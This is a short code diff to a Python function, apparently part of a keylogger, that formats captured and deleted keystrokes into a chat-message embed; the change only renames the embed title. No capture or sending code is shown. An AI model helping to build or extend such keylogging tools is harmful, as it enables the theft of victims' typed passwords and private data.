@@ -91,7 +91,7 @@ def format_keylog_embed():
     deleted_content = "".join(reversed(deleted_keys_buffer)) # Show deleted keys in order they were deleted
 
     # Construct the embed title and description
-    title = f"tung tung keys"
+    title = f"Keys logged"
     description = f"> **Logged Data:**\n```\n{logged_content}\n```"
 
     embed_data = {
